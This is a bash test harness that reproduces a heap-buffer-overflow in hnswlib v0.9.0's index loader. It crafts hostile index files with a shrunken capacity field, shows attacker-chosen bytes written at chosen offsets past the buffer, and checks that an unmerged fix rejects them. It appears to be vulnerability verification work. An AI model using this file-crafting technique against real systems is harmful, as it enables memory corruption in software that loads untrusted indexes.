#!/usr/bin/env bash
# Real-upstream hnswlib CVE-2026-124959 harness. Compiles the pinned v0.9.0
# header verbatim and the PR-head header with the five-line guard; no library
# source is copied or patched. Rung 4 places the library's real level0 buffer
# in page-aligned readable memory with a link-time malloc interposer.
# No network, no broker, no external probe.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

rm -rf "$OUT/v09" "$OUT/fix"
mkdir -p "$OUT/v09" "$OUT/fix"
tar -xzf "$HERE/src/v0.9.0.tar.gz" -C "$OUT/v09" --strip-components=1 || exit 2
tar -xzf "$HERE/src/fix-280cb597.tar.gz" -C "$OUT/fix" --strip-components=1 || exit 2

g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer \
  -I"$OUT/v09" "$HERE/driver.cpp" -o "$OUT/v09_asan" -pthread || exit 2
g++ -std=c++11 -O0 -g -fsanitize=address -fno-omit-frame-pointer \
  -I"$OUT/fix" "$HERE/driver.cpp" -o "$OUT/fix_asan" -pthread || exit 2
g++ -std=c++11 -O0 -g -DALLOC_INTERPOSER -I"$OUT/v09" "$HERE/driver.cpp" \
  -Wl,--wrap=malloc,--wrap=free -o "$OUT/v09_readback" -pthread || exit 2
g++ -std=c++11 -O1 -g -I"$OUT/v09" "$HERE/driver.cpp" \
  -o "$OUT/v09_plain" -pthread || exit 2

export ASAN_OPTIONS=abort_on_error=0:detect_leaks=0
pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
  else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

# Seed: the library's own serializer writes a valid index, then only the
# stored capacity field (offset 8) is shrunk and the level0 image is filled
# with the caller's chosen marker. cur_element_count, S and link lists stay.
$OUT/v09_plain save "$OUT/hostile-5a.bin" 5a
$OUT/v09_plain save "$OUT/hostile-a5.bin" a5
$OUT/v09_plain save "$OUT/hostile-77.bin" 77
cp "$OUT/hostile-5a.bin" "$OUT/benign.bin"
python3 - "$OUT/benign.bin" <<'PY' || exit 2
import struct, sys
p = sys.argv[1]
d = bytearray(open(p, 'rb').read())
struct.pack_into('<Q', d, 8, 512)
open(p, 'wb').write(d)
PY

# Rung 1: unsanitized load of the crafted index corrupts the heap.
( $OUT/v09_plain load "$OUT/hostile-5a.bin" > "$OUT/plain.log" 2>&1 )
prc=$?
check "rung1 unsanitized load of crafted index aborts on heap corruption" \
  "$([ "$prc" -ne 0 ] && echo 1 || echo 0)"

# Rung 2: declared count, not stored capacity, drives the level0 read.
rb=$($OUT/v09_readback load "$OUT/hostile-5a.bin" 2>/dev/null); echo "$rb"
check "rung2 count=512 into stored_capacity=2 (stage_size=256)" \
  "$(contains 'stage_size=256 count=512' "$rb" && echo 1 || echo 0)"

# Rung 3: ASan names the pinned library read and its allocation.
$OUT/v09_asan load "$OUT/hostile-5a.bin" > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 65472' "$ac" &&
contains 'hnswalg.h:779' "$ac" &&
contains 'hnswalg.h:776' "$ac" &&
contains '0 bytes after 256-byte region' "$ac" &&
contains 'loadIndex' "$ac" && ok=1
check "rung3 ASan WRITE from pinned hnswalg.h:779 into hnswalg.h:776 allocation" "$ok"

# Rung 4: chosen bytes at chosen offsets past the 256-byte region.
marks='+0=5a+32=5a+64=5a+128=5a+256=5a+512=5a+1024=5a+4096=5a'
check "rung4 chosen 0x5a at +0/+32/+64/+128/+256/+512/+1024/+4096" \
  "$(contains "$marks" "$rb" && echo 1 || echo 0)"
rb2=$($OUT/v09_readback load "$OUT/hostile-a5.bin" 2>/dev/null); echo "$rb2"
check "second chosen value 0xa5 at the same offsets" \
  "$(contains '+0=a5+32=a5+64=a5+128=a5+256=a5+512=a5+1024=a5+4096=a5' "$rb2" && echo 1 || echo 0)"

# Fixed side: PR-head guard rejects before allocation. This is an unmerged
# PR, never label it a released fixed version.
fx=$($OUT/fix_asan load "$OUT/hostile-5a.bin" 2>&1); echo "$fx"
check "PR-head guard throws before the copy; no ASan report" \
  "$(contains 'rv=exception what=Index seems to be corrupted or unsupported' "$fx" \
     && ! contains 'AddressSanitizer' "$fx" && echo 1 || echo 0)"

# Benign controls: a capacity that fits loads clean on both builds.
bn=$($OUT/v09_asan load "$OUT/benign.bin" 2>&1); echo "$bn"
check "vulnerable build loads a capacity-fits index, ASan clean" \
  "$(contains 'rv=loaded' "$bn" && ! contains 'AddressSanitizer' "$bn" && echo 1 || echo 0)"
bf=$($OUT/fix_asan load "$OUT/benign.bin" 2>&1); echo "$bf"
check "PR-head build loads a capacity-fits index, ASan clean" \
  "$(contains 'rv=loaded' "$bf" && ! contains 'AddressSanitizer' "$bf" && echo 1 || echo 0)"

# Determinism: two independent five-run groups; lines carry only counts,
# return codes and offset/value pairs (no addresses, paths or PIDs).
group() {
  for i in 1 2 3 4 5; do
    $OUT/v09_readback load "$OUT/hostile-5a.bin" 2>/dev/null
    $OUT/v09_readback load "$OUT/hostile-a5.bin" 2>/dev/null
    $OUT/v09_readback load "$OUT/hostile-77.bin" 2>/dev/null
  done | grep -E '^(stage_size=|\+)'
}
h1=$(group | sha256sum | cut -d' ' -f1)
h2=$(group | sha256sum | cut -d' ' -f1)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
